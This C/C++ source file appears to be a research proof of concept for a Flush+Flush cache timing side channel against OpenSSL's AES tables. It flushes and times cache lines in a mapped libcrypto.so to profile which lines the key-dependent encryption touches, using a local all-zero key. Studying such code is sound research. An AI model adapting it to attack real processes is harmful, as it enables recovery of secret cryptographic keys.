#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (110)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (9999)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

uint64_t rdtsc_nofences(void) { 
  uint64_t a, d; 
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory"); 
  return (d << 32) | a; 
} 
void flush(void *mem) { 
  asm volatile("clflush (%0)"::"r"(mem):"memory"); 
} 
void mfence(void) {
  asm volatile("mfence":::"memory");
}


int main()
{
  int fd = open("./openssl/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0)+0x1ccbc0;
  end = base + 1024;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc_nofences();
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    for (probe = base; probe < end; probe += 64)
    {
      size_t count = 0;
      sched_yield();
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        flush(probe);
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
	mfence();
        AES_encrypt(plaintext, ciphertext, &key_struct);
	mfence();
        size_t time = rdtsc_nofences();
        flush(probe);
	mfence();
        size_t delta = rdtsc_nofences() - time;
	mfence();
        if (delta > MIN_CACHE_MISS_CYCLES)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }

  for (auto ait : timings)
  {
    printf("%6p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%4lu", kit.second);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

